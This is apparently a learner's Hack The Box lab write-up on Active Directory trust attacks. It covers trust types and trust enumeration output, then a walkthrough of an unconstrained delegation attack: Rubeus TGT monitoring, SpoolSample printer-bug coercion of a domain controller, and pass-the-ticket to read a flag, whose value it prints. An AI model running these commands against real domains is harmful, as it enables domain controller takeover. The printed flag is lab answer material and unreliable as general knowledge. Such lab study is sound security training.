Active Directory Trust Attacks:

Why should we care about trusts?

Oftimes a penetration tester will find tehemselves assessing a large organization
where they are able to gain a foothould in their current Active Directory domain but unable
to escalate privileges. Enter trusts. Perhaps we have exhausted all aveneus of attack but 
find that we can kerberoast across a trust and compromise a child domain. Once compromised, 
we can use that access to easily compromise the parent domain that we are positioned in. 


How trust Relationships work for forest in Active Directory?

Active Directory Domain Services (AD DS) provides security across multiple domains or forests
through domain and forest trust relationships. Before authentication can occur across trusts,
Windows must first check if the domain beign requested by user, computer or service has a trust
relationships withe the domain of the requesting account.


To check for this trusts relationship, the Windows Security System computes a trust path between
the domain controller (DC) for the server that receives the request and a DC in the domain fo the
requesting account.


Trust Types:

While this module assumes an intermediate understanding of how Active Directory works, it's worth
defining the various types of trusts that we may encounter in the wild. Not all of these will be 
covered in this module.


Parent-Child: This tust relationship forms between a parent domain and a child domain within the same forest.
The parent domain inherenly trusts the child domain, and vice versa. Its established automatically whenever
a new child domain is created within a forest.

Tree-Root: This trust relationship links the root domain of one tree to the root domain of another three within
the same forest. Whenever a new tree is created in a forest, this trust is automatically established

External Trust:This trust link forms between a domain in one forest and a domain in a separate forest. It
facilitates users from one domain to access resources located inj the order domain. Typically, it's imnplemented
when accessing resources in a forest lacking established trust relationships.

Forest Trust:This trust relationship is established between two forests, specifically between the root domains
of earch foest. It enables users from one forest to access resources hosted in the other forest.

Shortcut (or Cross-Link) Trust: This trust connection emerges between two child domains belongin toi different
trees (or parent domains) within the same forest. It aims to minimize authentication hops between distant domains
and can be either one-way or two-way transitive.

Realm Trust: This trust relationship connects a windows domain with a non-Windows domain, such as a kerberos realm,
It enables users within the Windows domain to access reources situeated in the non-Windows domain.

The most commonly used are:
-	Parent Child
- 	Tree-Root
-	External
- 	Forest





## Windows PowerShell Commands below:

```bash
PS C:\htb> Import-Module activedirectory
PS C:\htb> Get-ADTrust -Filter *

Direction               : BiDirectional
DisallowTransivity      : False
DistinguishedName       : CN=logistics.ad,CN=System,DC=inlanefreight,DC=ad
ForestTransitive        : True
IntraForest             : False
IsTreeParent            : False
IsTreeRoot              : False
Name                    : logistics.ad
ObjectClass             : trustedDomain
ObjectGUID              : 8d52f9da-361b-4dc3-8fa7-af5f282fa741
SelectiveAuthentication : False
SIDFilteringForestAware : False
SIDFilteringQuarantined : False
Source                  : DC=inlanefreight,DC=ad
Target                  : logistics.ad
TGTDelegation           : False
TrustAttributes         : 8
TrustedPolicy           :
TrustingPolicy          :
TrustType               : Uplevel
UplevelOnly             : False
UsesAESKeys             : False
UsesRC4Encryption       : False

Direction               : BiDirectional
DisallowTransivity      : False
DistinguishedName       : CN=child.inlanefreight.ad,CN=System,DC=inlanefreight,DC=ad
ForestTransitive        : False
IntraForest             : True
IsTreeParent            : False
IsTreeRoot              : False
Name                    : child.inlanefreight.ad
ObjectClass             : trustedDomain
ObjectGUID              : 44591edf-66d2-4d8c-8125-facb7fb3c643
SelectiveAuthentication : False
SIDFilteringForestAware : False
SIDFilteringQuarantined : False
Source                  : DC=inlanefreight,DC=ad
Target                  : child.inlanefreight.ad
TGTDelegation           : False
TrustAttributes         : 32
TrustedPolicy           :
TrustingPolicy          :
TrustType               : Uplevel
UplevelOnly             : False
UsesAESKeys             : False
UsesRC4Encryption       : False
```

Trust Relationship is commonly used to know the security when a server request
for a service to another service in a Active Directory Service


```bash

PS C:\Users\htb-student\Downloads> cd C:\Tools
PS C:\Tools> Import-Module .\PowerView.ps1
PS C:\Tools> Get-DomainTrustMapping


SourceName      : inlanefreight.ad
TargetName      : logistics.ad
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Bidirectional
WhenCreated     : 12/26/2023 4:13:40 PM
WhenChanged     : 8/26/2024 6:15:49 AM

SourceName      : inlanefreight.ad
TargetName      : child.inlanefreight.ad
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection  : Bidirectional
WhenCreated     : 3/13/2024 12:46:48 PM
WhenChanged     : 8/26/2024 6:15:28 AM

SourceName      : child.inlanefreight.ad
TargetName      : inlanefreight.ad
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection  : Bidirectional
WhenCreated     : 3/13/2024 12:46:48 PM
WhenChanged     : 8/26/2024 6:15:28 AM

SourceName      : logistics.ad
TargetName      : inlanefreight.ad
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : TREAT_AS_EXTERNAL,FOREST_TRANSITIVE
TrustDirection  : Bidirectional
WhenCreated     : 12/26/2023 4:13:40 PM
WhenChanged     : 8/26/2024 6:15:49 AM

SourceName      : logistics.ad
TargetName      : MEGACORP.AD
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 3/9/2024 11:08:15 AM
WhenChanged     : 8/26/2024 6:15:50 AM
```



## Unconstrained Delegation


Unconstrained Delegation is an Active Directory feature that allows a service running under a user account
to impersonate other users and access resources on their behalf. This means tha the service can pass the 
user's credentials to other services without any restrictions, potentially exposing sensitive information
or allowing unauthorized acces to resources. Unconstrained delegation poses a significant security risk if not
properly configured.



### Samples:







```bash
PS C:\Tools> .\Rubeus.exe monitor /interval:5 /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3

[*] Action: TGT Monitoring
[*] Monitoring every 5 seconds for new TGTs


[*] 8/26/2024 7:59:17 AM UTC - Found new TGT:

  User                  :  Administrator@INLANEFREIGHT.AD
  StartTime             :  8/26/2024 2:59:00 AM
  EndTime               :  8/26/2024 12:58:59 PM
  RenewTill             :  9/2/2024 2:58:59 AM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :
```

In another cmd prompt

```bash
PS C:\Tools> .\SpoolSample.exe dc01.inlanefreight.ad dc02.dev.inlanefreight.ad
[+] Converted DLL to shellcode
[+] Executing RDI
[+] Calling exported function
TargetServer: \\dc01.inlanefreight.ad, CaptureServer: \\dc02.dev.inlanefreight.ad
Attempted printer notification and received an invalid handle. The coerced authentication probably worked!
PS C:\Tools>
```


And once we have the ticket in the first shell about rubeus.exe monitor /interval:5 /nowrap


We go the TGT hash

```bash
PS C:\Tools> .\Rubeus.exe renew /ticket:doIFvDCCBbigAwIB<snip code> /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3

[*] Action: Renew Ticket

[*] Using domain controller: DC01.INLANEFREIGHT.AD (172.16.210.99)
[*] Building TGS-REQ renewal for: 'INLANEFREIGHT.AD\DC01$'
[+] TGT renewal request successful!
[*] base64(ticket.kirbi):

      doIFvDCCBbigAwIBBaEDAgEWooIEuDCCBLRhggSwMIIErKADAgEFoRIbEElOTEFORUZSRUlHSFQuQUSi
      JTAjoAMCAQKhHDAaGw<snip code>ORUZSRUlHSFQuQUQ=
[+] Ticket successfully imported!
# Here with the last message, we know that now we have the ability to get access
# over the services indicated in the question
PS C:\Tools> dir "\\DC01\UCD_flag\flag.txt"


    Directory: \\DC01\UCD_flag


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        3/14/2024   3:42 PM             32 flag.txt


PS C:\Tools> Get-Content "\\DC01\UCD_flag\flag.txt"
dc130415baf0dd46e6e7fe3f3d3c5d93
```















